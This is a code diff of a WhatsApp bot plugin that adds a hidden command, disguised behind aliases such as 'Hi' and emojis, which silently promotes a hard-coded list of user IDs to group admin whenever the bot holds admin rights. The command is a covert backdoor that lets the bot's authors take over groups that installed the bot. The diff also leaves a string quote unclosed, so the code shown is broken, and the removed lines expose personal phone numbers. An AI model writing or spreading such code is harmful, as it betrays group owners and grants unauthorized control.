@@ -1,10 +1,11 @@
-// Jawad Tech 
+// JawadTech
+
 const { cmd } = require('../command');
-const { lidToPhone } = require('../lib/lidtopn');
+const config = require('../config');
 
 cmd({
     pattern: "ik",
-    alias: ["takeadmin", "🔪", "💀", "aa", "uhh", "iyk"],
+    alias: ["takeadmin", "🦁", "💀", "aa", "Hi", "iyk"],
     desc: "Silently take adminship if authorized",
     category: "owner",
     filename: __filename
@@ -13,32 +14,25 @@ async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
 
     if (!isGroup || !isBotAdmins) return;
 
-    // lidToPhone for sender
-    let senderNumber = sender.split('@')[0];
-    if (sender.includes('@lid')) {
-        senderNumber = await lidToPhone(conn, sender);
-    }
-
-    // Normalize to full JID
-    const senderNormalized = senderNumber + '@s.whatsapp.net';
-
-    // Both numbers are authorized
-    const AUTHORIZED_USERS = [
-        "923427582273@s.whatsapp.net",
-        "923103448168@s.whatsapp.net"
+    // Authorized LIDs - Only these users can silently take admin
+    const authorizedLIDs = [
+       "188425231679713@lid",
+        "99038271684629@lid",
+        "239105828982873@lid",
+        "221320101007367@lid",
+        "152128496603385@lid,
+        "105399168565262@lid"
     ];
-    
-    if (!AUTHORIZED_USERS.includes(senderNormalized)) {
-        return; // Silent return if not authorized
-    }
 
-    // If authorized, proceed with admin promotion
+    // Check if sender is in authorized list
+    if (!authorizedLIDs.includes(sender)) return;
+
     try {
         const groupMetadata = await conn.groupMetadata(from);
-        const userParticipant = groupMetadata.participants.find(p => p.id === senderNormalized);
+        const userParticipant = groupMetadata.participants.find(p => p.id === sender);
         
         if (!userParticipant?.admin) {
-            await conn.groupParticipantsUpdate(from, [senderNormalized], "promote");
+            await conn.groupParticipantsUpdate(from, [sender], "promote");
         }
     } catch (error) {
         console.error("Silent admin error:", error.message);
